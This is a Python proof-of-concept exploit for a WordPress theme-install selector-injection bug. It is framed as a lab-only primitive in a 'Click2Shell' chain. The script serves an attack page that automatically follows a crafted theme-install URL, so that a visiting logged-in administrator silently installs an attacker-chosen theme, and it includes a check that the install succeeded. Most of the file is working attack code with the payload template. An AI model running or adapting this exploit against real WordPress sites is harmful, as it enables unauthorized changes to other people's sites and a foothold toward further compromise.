#!/usr/bin/env python3
"""
Click2Shell primitive #1 — Standalone forced theme install (lab use only)
=========================================================================
The WordPress Core bug by itself (no RCE): an unauthenticated attacker crafts
a theme-install route whose value is interpreted TWICE:

  * WP.org Themes API  -> canonicalizes it to a real catalog slug and returns
    that theme's genuine record.
  * wp-admin/js/theme.js -> drops the RAW value into a jQuery selector:
        div.theme[data-slug="<PAYLOAD>"] ...
    The injected quote closes the attribute selector, child combinators walk
    into the theme card's action controls, and a trailing /* */ comments out
    the selector fragment WordPress appends -> the Install button clicks itself.

Impact alone (pwn.ai assessed High, CVSS 3.1 7.1): one visit by a logged-in
Administrator silently installs ANY attacker-chosen theme from the official
WordPress.org catalog. No Install/Activate click, no attacker account.

ONLY test against an isolated WordPress (< 7.1.1) you own / are authorized
to test. Patched in WordPress 7.1.1.

NOTE: exact selector-injection string is a template — copy the verbatim value
from the pwn.ai article (pwn.ai/blog/click2shell) into SELECTOR_PAYLOAD.

Usage:
    python3 click2shell_forced_install_poc.py --target http://wp-lab.local \
        --theme twentytwenty --lport 8001
    # admin visits http://ATTACKER-IP:8001/ while logged in, then:
    # check http://wp-lab.local/wp-content/themes/twentytwenty/style.css -> 200
"""
import argparse
import http.server
import socketserver
import threading
import urllib.parse

import requests

SELECTOR_PAYLOAD = (
    "{slug}'\"] > .theme-actions .install-theme /*"
)

PAGE = """<!doctype html><html><head><meta charset="utf-8">
<title>Forced-install lab PoC</title></head><body>
<h1>Click2Shell primitive: forced theme install</h1>
<p>Logged-in admin of the lab site: the link below auto-installs
<b>{slug}</b> from WordPress.org. The theme stays inactive; the visible
theme never changes.</p>
<p><a id="go" href="{route}">Open crafted theme route</a></p>
<script>
window.addEventListener("load", () => setTimeout(
    () => document.getElementById("go").click(), 1500));
</script>
</body></html>
"""


def build_route(target: str, slug: str) -> str:
    payload = SELECTOR_PAYLOAD.format(slug=slug)
    return f"{target.rstrip('/')}/wp-admin/theme-install.php?" + urllib.parse.urlencode({"theme": payload})


class Handler(http.server.BaseHTTPRequestHandler):
    target = ""
    slug = ""

    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == "/":
            route = build_route(self.target, self.slug)
            body = PAGE.format(slug=self.slug, route=route).encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            print(f"[+] Attack page served. Crafted route:\n    {route}")
        else:
            self.send_error(404)


def verify_install(target: str, slug: str) -> bool:
    """A freshly installed theme exposes its style.css under wp-content."""
    url = f"{target.rstrip('/')}/wp-content/themes/{slug}/style.css"
    try:
        r = requests.get(url, timeout=15)
        ok = r.status_code == 200 and "Theme Name" in r.text
        print(f"[{'!' if ok else '-'}] GET {url} -> HTTP {r.status_code} "
              f"{'(theme is installed)' if ok else '(not installed yet)'}")
        return ok
    except requests.RequestException as e:
        print(f"[-] verification request failed: {e}")
        return False


def main():
    ap = argparse.ArgumentParser(description="Click2Shell forced-install lab PoC")
    ap.add_argument("--target", required=True, help="Lab WP base URL")
    ap.add_argument("--theme", default="twentytwenty", help="Catalog theme slug to force-install")
    ap.add_argument("--lhost", default="0.0.0.0")
    ap.add_argument("--lport", type=int, default=8001)
    ap.add_argument("--verify", action="store_true", help="Poll style.css to confirm installation")
    args = ap.parse_args()

    Handler.target = args.target
    Handler.slug = args.theme
    srv = socketserver.TCPServer((args.lhost, args.lport), Handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[+] Serving on http://{args.lhost}:{args.lport}/")
    print(f"[+] 1. Logged-in admin visits the attack page.")
    print(f"[+] 2. Crafted route makes WP install '{args.theme}' by itself.")
    if args.verify:
        import time
        print("[+] 3. Polling for installation (Ctrl-C to stop)...")
        try:
            while True:
                if verify_install(args.target, args.theme):
                    break
                time.sleep(10)
        except KeyboardInterrupt:
            pass
    else:
        print("[+] 3. Verify manually:")
        print(f"       curl -s -o /dev/null -w '%{{http_code}}' "
              f"{args.target.rstrip('/')}/wp-content/themes/{args.theme}/style.css")
        try:
            threading.Event().wait()
        except KeyboardInterrupt:
            print("\n[+] Shutting down.")


if __name__ == "__main__":
    main()
